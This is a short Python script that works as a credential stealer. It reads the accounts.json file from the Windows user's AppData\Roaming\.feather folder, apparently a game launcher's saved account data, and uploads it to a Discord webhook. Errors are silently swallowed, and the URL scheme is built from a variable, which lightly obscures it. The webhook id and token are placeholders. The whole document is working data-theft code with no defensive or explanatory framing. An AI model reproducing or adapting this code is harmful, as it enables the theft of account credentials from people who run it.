import os
import requests

def kasuto():
    try:
        username = os.getenv('USERNAME')
        if not username:
            return

        file_path = os.path.join("C:\\Users", username, "AppData", "Roaming", ".feather", "accounts.json")
        if not os.path.exists(file_path):
            return

        with open(file_path, "rb") as f:
            files = {'file': ("accounts.json", f)}
            requests.post(webhook_url, files=files)
    except:
        pass

webhook_id = "id"
webhook_token = "token"
f = "https"

webhook_url = f"{f}://discord.com/api/webhooks/{webhook_id}/{webhook_token}"

kasuto()